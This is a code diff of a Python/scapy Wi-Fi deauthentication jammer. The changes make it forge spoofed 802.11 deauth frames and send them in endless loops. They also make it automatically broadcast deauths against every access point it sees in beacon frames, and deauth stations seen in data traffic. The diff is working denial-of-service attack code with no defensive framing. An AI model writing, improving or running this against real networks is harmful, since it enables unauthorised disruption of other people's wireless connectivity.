@@ -13,6 +13,7 @@ import re
 from pull import PULL
 from scapy.sendrecv import sniff
 from scapy.sendrecv import sendp
+from scapy.sendrecv import send
 from scapy.layers.dot11 import Dot11Beacon
 from scapy.layers.dot11 import Dot11
 from scapy.layers.dot11 import Dot11Elt
@@ -25,6 +26,7 @@ class JAMMER:
 
 	__ACCESSPOINTS = []
 	__FORGERS      = []
+	__ONRUN        = []
 
 	def __init__(self, prs):
 		self.interface = prs.interface
@@ -53,11 +55,13 @@ class JAMMER:
 
 	def forge(self, sn, rc):
 		pkt = RadioTap() / Dot11(
-				addr1=rc,
-				addr2=sn,
-				addr3=sn
+			type=0, 
+			subtype=12,
+			addr1=rc, 
+			addr2=sn, 
+			addr3=sn
 			) / Dot11Deauth(
-				reason=self.code
+			reason=7
 			)
 
 		return pkt
@@ -71,32 +75,41 @@ class JAMMER:
 
 		return ess
 
-	def send(self, sender, receiver):
-		pkts = (
-			self.forge(sender, receiver),
-			self.forge(receiver, sender)
+	def jammer(self, pkt, sn, rc):
+		send(
+			pkt,
+			inter=self.delay,
+			iface=self.interface,
+			count=self.packets,
+			loop=1,
+			verbose=False
 		)
 
-		self.__FORGERS.append(pkts)
-		#for pkt in pkts:
-		#	sendp(
-		#		pkt,
-		#		iface=self.interface,
-		#		count=self.packets,
-		#		verbose=False
-		#	)
-			
-		#essid = self.get_ess(sender, receiver)
-		#pull.print("*",
-		#	"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
-		#		count=pull.RED+str(self.packets)+pull.END,
-		#		code =pull.GREEN+str(self.code)+pull.END,
-		#		sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
-		#		receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
-		#		essid=essid
-		#	),
-		#	pull.YELLOW
-		#)
+	def send(self, sender, receiver):
+		pkt = self.forge(sender, receiver)
+		essid = self.get_ess(sender, receiver)
+		
+		if pkt not in self.__ONRUN:
+			self.__ONRUN.append( pkt )	
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
+					count=pull.RED+str(self.packets)+pull.END,
+					code =pull.GREEN+str(self.code)+pull.END,
+					sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
+					receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
+					essid=essid
+				),
+				pull.YELLOW
+			)
+
+			sendp(
+				pkt,
+				inter=self.delay,
+				iface=self.interface,
+				count=self.packets,
+				loop=1,
+				verbose=False
+			)
 
 	def deauthenticate(self, sender, receiver):
 		if self.aps and self.stations and self.filters:
@@ -149,7 +162,10 @@ class JAMMER:
 
 	def injector(self, pkt):
 		if pkt.haslayer(Dot11Beacon):
-			macaddr = pkt.getlayer(Dot11FCS).addr2
+			try:
+				macaddr = pkt.getlayer(Dot11FCS).addr2
+			except:
+				macaddr = pkt.getlayer(Dot11).addr2
 			essid   = self.extract_essid(pkt.getlayer(Dot11Elt))
 			toappend = {
 				'bssid': macaddr,
@@ -159,43 +175,18 @@ class JAMMER:
 				self.__ACCESSPOINTS.append(
 						toappend
 					)
-		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2:
+				self.deauthenticate( macaddr, "ff:ff:ff:ff:ff:ff" )
+		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
 			sender   = pkt.getlayer(Dot11FCS).addr2
 			receiver = pkt.getlayer(Dot11FCS).addr1
 
 			self.deauthenticate(sender, receiver)
 
-	def jammer(self):
-		while True:
-			try:
+		elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
+			sender   = pkt.getlayer(Dot11).addr2
+			receiver = pkt.getlayer(Dot11).addr1
 
-				pkts = self.__FORGERS[0]
-				del self.__FORGERS[0]
-
-				for pkt in pkts:
-					sendp(
-						pkt,
-						iface=self.interface,
-						count=self.packets,
-						verbose=False
-					)
-					time.sleep(0.5)
-
-				essid = self.get_ess(sender, receiver)
-				pull.print("*",
-					"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
-						count=pull.RED+str(self.packets)+pull.END,
-						code =pull.GREEN+str(self.code)+pull.END,
-						sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
-						receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
-						essid=essid
-					),
-					pull.YELLOW
-				)
-				time.sleep(self.delay)
-
-			except Exception as e:
-				pass
+			self.deauthenticate(sender, receiver)
 
 	def hopper(self, chs):
 		if type(chs) == tuple:
@@ -213,10 +204,6 @@ class JAMMER:
 
 	def engage(self):
 		t = threading.Thread(target=self.hopper, args=(self.channel,))
-		t.daemon = True
-		t.start()
-
-		t = threading.Thread(target=self.jammer)
 		t.daemon = True
 		t.start()
 
@@ -282,6 +269,8 @@ class PARSER:
 		else:
 			return retval
 
+		return retval
+
 	def stations(self, sts):
 		retval = []
 		if sts:
@@ -295,6 +284,8 @@ class PARSER:
 		else:
 			return retval
 
+		return retval
+
 	def filters(self, fts):
 		retval = []
 		if fts:
@@ -307,6 +298,8 @@ class PARSER:
 					pull.halt("Not a Valid MAC Address [%s]" % ft, True, pull.RED)
 		else:
 			return retval
+
+		return retval
 
 	def interface(self, iface):
 		def getNICnames():
@@ -347,8 +340,8 @@ def main():
 	parser.add_argument('-s', '--stations' , dest="stations" , default="", type=str)
 	parser.add_argument('-f', '--filters'  , dest="filters"  , default="", type=str)
 	parser.add_argument('--code'           , dest="code"     , default=7 , type=int)
-	parser.add_argument('--delay'          , dest="delay"    , default=0 , type=int)
-	parser.add_argument('--packets'        , dest="packets"  , default=64, type=int)
+	parser.add_argument('--delay'          , dest="delay"    , default=0.1 , type=int)
+	parser.add_argument('--packets'        , dest="packets"  , default=1, type=int)
 	parser.add_argument('--verbose'        , dest="verbose"  , default=False, action="store_true")
 
 	options = parser.parse_args()
